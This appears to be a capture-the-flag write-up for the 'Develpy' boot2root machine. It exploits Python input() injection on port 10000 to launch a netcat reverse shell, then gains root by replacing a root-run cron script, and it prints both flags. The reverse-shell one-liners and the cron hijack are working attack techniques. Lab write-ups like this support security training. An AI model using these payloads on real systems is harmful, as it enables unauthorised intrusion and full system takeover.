# Develpy

boot2root machine for FIT and bsides Guatemala CTF

# User flag

Nmap reveals 2 open ports: SSH running on the standard port `22`, and an unknown application on port `10000`:

~~~
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)
|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)
|_  256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   GenericLines: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 0
|     SyntaxError: unexpected EOF while parsing
|   GetRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'OPTIONS' is not defined
|   NULL: 
|     Private 0days
|_    Please enther number of exploits to send??:
~~~

Connecting to the port 10000 in our browser produces an error which informs us that the program behind is called `exploit.py` (a python script):

~~~

        Private 0days

 Please enther number of exploits to send??: Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
  File "<string>", line 1, in <module>
NameError: name 'GET' is not defined
~~~

Let's connect with netcat or telnet. The python script asks for a number, and performs kind of `n` ping where `n` is the number we provided: 

~~~
$ telnet 10.10.135.158 10000
Trying 10.10.135.158...
Connected to 10.10.135.158.
Escape character is '^]'.

        Private 0days

 Please enther number of exploits to send??: 2

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.035 ms
Exploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.095 ms
Connection closed by foreign host.
~~~

Making some research on injections against the python `input()` function led me to [this link](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1). Let's try to inject a netcat reverse shell.

~~~
$ echo "__import__('os').system('nc -e /bin/bash 10.9.0.54 4444')" | nc 10.10.135.158 10000
~~~

On the workstation, our listener receives a feedback and we have a reverse shell:

~~~
unknown@kali:/data/vpn$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.9.0.54] from (UNKNOWN) [10.10.135.158] 38628
SHELL=/bin/bash script -q /dev/null
king@ubuntu:~$ 
~~~

Let's get the user flag:

~~~
king@ubuntu:~$ ls -la
ls -la
total 324
drwxr-xr-x 4 king king   4096 Aug 27  2019 .
drwxr-xr-x 3 root root   4096 Aug 25  2019 ..
-rw------- 1 root root   2929 Aug 27  2019 .bash_history
-rw-r--r-- 1 king king    220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 king king   3771 Aug 25  2019 .bashrc
drwx------ 2 king king   4096 Aug 25  2019 .cache
-rwxrwxrwx 1 king king 272113 Aug 27  2019 credentials.png
-rwxrwxrwx 1 king king    408 Aug 25  2019 exploit.py
drwxrwxr-x 2 king king   4096 Aug 25  2019 .nano
-rw-rw-r-- 1 king king      5 Jul  2 11:25 .pid
-rw-r--r-- 1 king king    655 Aug 25  2019 .profile
-rw-r--r-- 1 root root     32 Aug 25  2019 root.sh
-rw-rw-r-- 1 king king    139 Aug 25  2019 run.sh
-rw-r--r-- 1 king king      0 Aug 25  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 king king     33 Aug 27  2019 user.txt
-rw-r--r-- 1 root root    183 Aug 25  2019 .wget-hsts
king@ubuntu:~$ cat user.txt
cat user.txt
cf85ff769cfaaa721758949bf870b019
~~~

User flag: `cf85ff769cfaaa721758949bf870b019`

# Root flag

Unfortunately, we can't check `king`'s privileges with `sudo -l` as we don't have the password. There is a picture named `credentials.png` but it does not really help (is there really something here?).

Let's check the `crontab`.

~~~
king@ubuntu:~$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	king	cd /home/king/ && bash run.sh
*  *	* * *	root	cd /home/king/ && bash root.sh
*  *	* * *	root	cd /root/company && bash run.sh
#
~~~

There are 3 jobs scheduled to run every minute, 1 of which executed by `root`. Here is the content of the `root.sh` script which is in our `home` directory:

~~~
king@ubuntu:~$ cat /home/king/root.sh
python /root/company/media/*.py
king@ubuntu:~$ ls -l /home/king/root.sh
ls -l /home/king/root.sh
-rw-r--r-- 1 root root 32 Aug 25  2019 /home/king/root.sh
~~~

What is really interesting here is that we have a script in our home directory, that is executed by root. Even if we don't have direct write access to it, we can remove it and recreate a new one because it is in our home directory (and hence inherits from the `home` privileges). Let's do it:

~~~
king@ubuntu:~$ cd /home/king/
king@ubuntu:~$ rm root.sh
king@ubuntu:~$ printf '#!/bin/bash\nnc -e /bin/bash 10.9.0.54 5555' > root.sh
king@ubuntu:~$ chmod +x root.sh
~~~

In another reverse shell, we are now root:

~~~
unknown@kali:/data/tmp/files$ rlwrap nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.9.0.54] from (UNKNOWN) [10.10.135.158] 44040
SHELL=/bin/bash script -q /dev/null
root@ubuntu:/home/king# id
id
uid=0(root) gid=0(root) groups=0(root)
~~~

Let's get the root flag:

~~~
root@ubuntu:/home/king# cd /root
cd /root
root@ubuntu:~# ll
ll
total 32
drwx------  4 root root 4096 Aug 25  2019 ./
drwxr-xr-x 22 root root 4096 Aug 25  2019 ../
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  4 root root 4096 Aug 27  2019 company/
-rw-r--r--  1 root root 1185 Nov 12  2018 .gitignore
drwxr-xr-x  2 root root 4096 Aug 25  2019 .nano/
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Aug 25  2019 root.txt
root@ubuntu:~# cat root.txt
cat root.txt
9c37646777a53910a347f387dce025ec
~~~

Root flag: `9c37646777a53910a347f387dce025ec`
